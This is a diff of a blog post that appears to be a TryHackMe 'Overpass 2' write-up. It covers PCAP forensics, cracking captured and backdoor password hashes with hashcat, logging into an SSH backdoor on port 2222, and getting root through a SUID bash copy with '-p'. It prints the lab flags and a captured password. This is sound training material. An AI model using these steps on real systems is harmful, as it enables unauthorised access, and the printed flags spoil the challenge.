@@ -6,17 +6,15 @@ categories:
   - TryHackMe
 ---
 
-<img src="overpass2.png" alt="" width=200/>
+{{< post-img src="overpass2.png" alt="overpass2" style="width: 200px;" >}}
 
 ## Forensics
 
 Oh cool blue team stuff
-
 we are provided with a PCAP file...wireshark read those better
-
 filter for http
 
-```
+```bash
 )n)ºHEô
 .@@VTÀ¨ªÀ¨ªºvPÃró:
 'ö©ó
@@ -49,7 +47,7 @@ Then filter by tcp and follow the steam
 
 that guy use `sudo -l` like a Boss
 
-```
+```bash
 james@overpass-production:~$ sudo -l
 sudo -l
 [sudo] password for james: whenevernoteartinstant
@@ -107,13 +105,13 @@ Backdoor = persistence
 
 Ok time to crack them hashes
 
-```
+```bash
 └──╼ $hashcat -m 1800 hashes.txt /usr/share/wordlists/fasttrack.txt
 hashcat (v6.1.1) starting...
 
 ...
 
-james: 
+james:
 
 paradox: secuirty3
 
@@ -130,21 +128,19 @@ haha only james password in not in `fasttrack.txt`...we can stop blaming it on j
 ## Research
 
 Ok next we go analyze `ssh-backdoor` on github
-
 Just read and understand the stuff
-
 You can find the hash used by the attacker in the same tcp steam as before
-
 ok I am a nice person so here you go
-```
+
+```bash
 james@overpass-production:~/ssh-backdoor$ ssh-keygen
 ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/james/.ssh/id_rsa): id_rsa
 id_rsa
-Enter passphrase (empty for no passphrase): 
+Enter passphrase (empty for no passphrase):
 
-Enter same passphrase again: 
+Enter same passphrase again:
 
 Your identification has been saved in id_rsa.
 Your public key has been saved in id_rsa.pub.
@@ -172,7 +168,7 @@ SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
 
 Crackng time again
 
-```
+```bash
 └──╼ $haiti 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
 SHA-512 [HC: 1700] [JtR: raw-sha512]
 SHA3-512 [HC: 17600] [JtR: raw-sha3]
@@ -192,7 +188,7 @@ yeah as expected...but don't forget to add the salt
 
 so more like hashcat mode 1710
 
-```
+```bash
 └──╼ $hashcat -m 1710 '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05' /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 
@@ -203,22 +199,18 @@ you get the password `november16`
 ## Attack
 
 now we are in red team again! we go in
-
 Just visit the website to see the deface message
 
-like the pro say, its alwas cool to leave information about you when you hack a machine
-
+like the pro say, its always cool to leave information about you when you hack a machine
 it makes you look cool, and how else would people know it was you? lol
 
 Anyway, james probably changed his ssh password so don't bother
-
 But the backdoor may still be there
 
-### nmap
-```
+```bash
 PORT     STATE SERVICE REASON  VERSION
 22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCytc0lfgdX4r5ZxA8cr9Qi/66ppcB+fyEtT75IUtKC32Y/rpvBfFGRg9YxHVhKQKBDh1KlgXL3hJTJH1aqjEPtwXORQx+QmK5yFFQa524mKj3WzFZswUcDTk4s4F+m761x+QZMcb//UJhWuqiZ2QV+GW1UJsawrFhK3nogzIQ/eomxxR6TodNx2z2CzVahLULWcQjAMOKPAlqF5vsaoWk39Y4u9JDqA2JdEI2//kIb4RjuMbZDOtUDCgPypTCMgLKzIzAZQ54nWsHoUHoGUdPlon1mkVKgno/9cjZVwqveqQpQpO3DrQpjdB6xiCzBz34H9iUMvCEgJab64WkIGLGH
 |   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
@@ -227,32 +219,30 @@ PORT     STATE SERVICE REASON  VERSION
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPQ1lZqbCdY81xFaGZ1fwaVxJExe5+meLXraNAjwWTAm
 
 80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET POST OPTIONS HEAD
 |_http-title: LOL Hacked
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 
 2222/tcp open  ssh     syn-ack OpenSSH 8.2p1 Debian 4 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDlwW5RS5iWPR+x1AVz4TAWAr/fSvF3KC16voiHSUImF8fNiWT4Pcb5KADkmhssq4amO2uyN+gF9KpEbXrVj63hKdkJrF4lQnzlxX8mHeeg9CLWA1/zI1BZ8TDmC9h45K3DwJjcD8zb56JPDi20PoIjVe3zUe3lf2geBxsAyhR5Cs4vWWUBzyocdkFDu+QXirPJv5lxcuiPhUVyDQZtHOK9evrXOOpeZiYgpqxcYTqHk5JcZbrV1sTNU8mkQiJXuVDQO+hOoOO7yES3reMv0pDXtc/Cfz5ZHJuAaGhU/fawIjUBlIeXY3wjUJe3UYgm1qE/idyq+9rU5TVApjxo+mjR
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
 ```
 
 you see that ssh on port 2222? yeah that's the backdoor
-
 It was visible in the PCAP tcp stream too
 
 We connect to that
 
-```
+```bash
 └──╼ $ssh james@10.10.122.169 -p 2222
 The authenticity of host '[10.10.122.169]:2222 ([10.10.122.169]:2222)' can't be established.
 RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '[10.10.122.169]:2222' (RSA) to the list of known hosts.
-james@10.10.122.169's password: 
+james@10.10.122.169's password:
 To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
 
@@ -260,11 +250,11 @@ james@overpass-production:/home/james/ssh-backdoor$
 
 james@overpass-production:/home/james$ cat user.txt
 thm{james_did_nothing_wrong}
-
 ```
+
 In the same folder there are hidden files
 
-```
+```bash
 james@overpass-production:/home/james$ ls -al
 total 1136
 drwxr-xr-x 7 james james    4096 Jul 22  2020 .
@@ -284,11 +274,10 @@ drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
 drwxrwxr-x 7 james james    4096 Jul 21  2020 www
 ```
 
-`.suid_bash` is owned by root? interresting
-
+`.suid_bash` is owned by root? interesting
 check for `suid` (its in the name) and yes it's there
 
-```
+```bash
 james@overpass-production:/home/james$ find / -perm -u=s 2>/dev/null
 /usr/bin/chsh
 /usr/bin/sudo
@@ -313,26 +302,18 @@ james@overpass-production:/home/james$ find / -perm -u=s 2>/dev/null
 /bin/umount
 /home/james/.suid_bash
 ```
-we already know how to abuse `bash` in suid 
 
+we already know how to abuse `bash` in suid
 there is a nice `-p` flag you might want to read about
 
 
-```
+```bash
 james@overpass-production:/home/james$ ./.suid_bash -p
 .suid_bash-4.4# whoami
 root
 
 .suid_bash-4.4# cat root.txt
 thm{Cooctusclan_is_busted}
-
 ```
+
 Overpass 2 completed!
-
-
-
-
-
-
-
-
